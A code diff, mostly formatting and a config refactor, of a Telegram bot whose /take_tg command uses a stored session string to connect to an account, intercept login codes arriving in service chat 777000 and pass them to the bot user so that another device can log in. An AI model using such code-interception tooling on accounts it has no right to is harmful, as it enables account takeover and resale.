@@ -11,22 +11,23 @@ from telethon.errors import SessionRevokedError, FloodWaitError
 from telethon.sessions import StringSession
 from telethon.tl.functions.account import GetAuthorizationsRequest
 
+from config import settings
 from bot.core.bot_instance import bot
 from db.services.telegram_crud import (
     get_telegram_account_by_alias,
     delete_telegram_account,
 )
 from db.models.model import User
-from dotenv import load_dotenv
 
-load_dotenv()
-API_TELETHON_ID = int(os.getenv("API_TELETHON_ID"))
-API_TELETHON_HASH = os.getenv("API_TELETHON_HASH")
+
+API_TELETHON_ID = settings.API_TELETHON_ID
+API_TELETHON_HASH = settings.API_TELETHON_HASH
 
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
 
 router = Router()
+
 
 async def poll_for_new_session(
     client: TelegramClient,
@@ -34,7 +35,7 @@ async def poll_for_new_session(
     alias: str,
     phone: str,
     chat_id: int,
-    max_duration: int = 60
+    max_duration: int = 60,
 ):
     """
     Периодически проверяет, не появилось ли больше сессий, чем было при старте (initial_count).
@@ -57,13 +58,19 @@ async def poll_for_new_session(
         except SessionRevokedError:
             # Сессию аннулировали (Terminate all sessions)
             logger.warning(f"Session revoked for alias={alias}, phone={phone}")
-            await bot.send_message(chat_id, f"Сессия аккаунта <b>{alias}</b> отозвана. Удаляем из БД.", parse_mode="HTML")
+            await bot.send_message(
+                chat_id,
+                f"Сессия аккаунта <b>{alias}</b> отозвана. Удаляем из БД.",
+                parse_mode="HTML",
+            )
             delete_telegram_account(alias, phone)
             await client.disconnect()
             return
         except FloodWaitError as e:
             # Telegram просит подождать e.seconds
-            logger.warning(f"FloodWaitError: нужно подождать {e.seconds} сек. alias={alias}, phone={phone}")
+            logger.warning(
+                f"FloodWaitError: нужно подождать {e.seconds} сек. alias={alias}, phone={phone}"
+            )
             await asyncio.sleep(e.seconds)
             continue
         except Exception as e:
@@ -79,22 +86,26 @@ async def poll_for_new_session(
             await bot.send_message(
                 chat_id,
                 f"Аккаунт <b>{alias}</b> удалён из БД (обнаружена новая сессия).",
-                parse_mode="HTML"
+                parse_mode="HTML",
             )
             await client.disconnect()
             return
 
     # Если мы дошли сюда, значит время вышло, а новой сессии не появилось
-    logger.info(f"Timeout reached for alias={alias}, phone={phone}. No new session found.")
+    logger.info(
+        f"Timeout reached for alias={alias}, phone={phone}. No new session found."
+    )
     await bot.send_message(
         chat_id,
         f"Время ожидания (до {max_duration} сек.) истекло, новая сессия не появилась. "
         "Если вы не смогли авторизоваться, попробуйте заново.",
-        parse_mode="HTML"
+        parse_mode="HTML",
     )
 
 
-async def listen_for_code_and_check_session(string_session: str, chat_id: int, alias: str, phone: str):
+async def listen_for_code_and_check_session(
+    string_session: str, chat_id: int, alias: str, phone: str
+):
     """
     Подключается к Телеграму, слушает чат 777000 для перехвата кода
     и параллельно проверяет появление новых сессий через GetAuthorizationsRequest.
@@ -104,7 +115,9 @@ async def listen_for_code_and_check_session(string_session: str, chat_id: int, a
     :param alias: Alias аккаунта
     :param phone: Телефон аккаунта
     """
-    client = TelegramClient(StringSession(string_session), API_TELETHON_ID, API_TELETHON_HASH)
+    client = TelegramClient(
+        StringSession(string_session), API_TELETHON_ID, API_TELETHON_HASH
+    )
     await client.connect()
 
     # Сколько сессий уже есть?
@@ -114,12 +127,18 @@ async def listen_for_code_and_check_session(string_session: str, chat_id: int, a
     except SessionRevokedError:
         # Сессия отозвана до того, как мы вообще начали
         logger.warning(f"Session revoked immediately for alias={alias}, phone={phone}")
-        await bot.send_message(chat_id, f"Сессия аккаунта <b>{alias}</b> уже отозвана. Удаляем из БД.", parse_mode="HTML")
+        await bot.send_message(
+            chat_id,
+            f"Сессия аккаунта <b>{alias}</b> уже отозвана. Удаляем из БД.",
+            parse_mode="HTML",
+        )
         delete_telegram_account(alias, phone)
         await client.disconnect()
         return
     except Exception as e:
-        logger.exception(f"Failed to get authorizations for alias={alias}, phone={phone}: {e}")
+        logger.exception(
+            f"Failed to get authorizations for alias={alias}, phone={phone}: {e}"
+        )
         await bot.send_message(chat_id, f"Ошибка при получении списка сессий: {e}")
         await client.disconnect()
         return
@@ -137,18 +156,26 @@ async def listen_for_code_and_check_session(string_session: str, chat_id: int, a
             await bot.send_message(
                 chat_id,
                 f"🔑 Ваш код подтверждения: <code>{code}</code>",
-                parse_mode="HTML"
+                parse_mode="HTML",
             )
 
     # Запускаем фоновый опрос сессий
-    asyncio.create_task(poll_for_new_session(client, initial_count, alias, phone, chat_id))
+    asyncio.create_task(
+        poll_for_new_session(client, initial_count, alias, phone, chat_id)
+    )
 
     # Удерживаем подключение
     try:
         await client.run_until_disconnected()
     except SessionRevokedError:
-        logger.warning(f"Session revoked while listening for code. alias={alias}, phone={phone}")
-        await bot.send_message(chat_id, f"Сессия аккаунта <b>{alias}</b> была отозвана. Удаляем из БД.", parse_mode="HTML")
+        logger.warning(
+            f"Session revoked while listening for code. alias={alias}, phone={phone}"
+        )
+        await bot.send_message(
+            chat_id,
+            f"Сессия аккаунта <b>{alias}</b> была отозвана. Удаляем из БД.",
+            parse_mode="HTML",
+        )
         delete_telegram_account(alias, phone)
         await client.disconnect()
     except Exception as e:
@@ -163,11 +190,15 @@ async def cmd_take_tg(message: types.Message, current_user: User):
     Выводит номер телефона, привязанный к аккаунту, и запускает фоновый процесс
     для прослушивания чата и проверки новых сессий.
     """
-    alias = message.text.split(maxsplit=1)[1].strip() if len(message.text.split()) > 1 else None
+    alias = (
+        message.text.split(maxsplit=1)[1].strip()
+        if len(message.text.split()) > 1
+        else None
+    )
     if not alias:
         await message.answer(
             "Введите alias аккаунта после команды. Пример: /take_tg <i>my_account</i>",
-            parse_mode="HTML"
+            parse_mode="HTML",
         )
         return
 
@@ -177,7 +208,7 @@ async def cmd_take_tg(message: types.Message, current_user: User):
         return
 
     # Выводим информацию об аккаунте
-    if account.get('two_factor'):
+    if account.get("two_factor"):
         msg_text = (
             f"✅ Вот номер телефона, привязанный к аккаунту <b>{alias}</b>:\n"
             f"📞 <code>{account['phone']}</code>\n"
@@ -196,9 +227,9 @@ async def cmd_take_tg(message: types.Message, current_user: User):
     # Запускаем фоновую задачу для прослушки кода и проверки новых сессий
     asyncio.create_task(
         listen_for_code_and_check_session(
-            string_session=account['session_string'],
+            string_session=account["session_string"],
             chat_id=message.chat.id,
             alias=alias,
-            phone=account['phone']
+            phone=account["phone"],
         )
     )
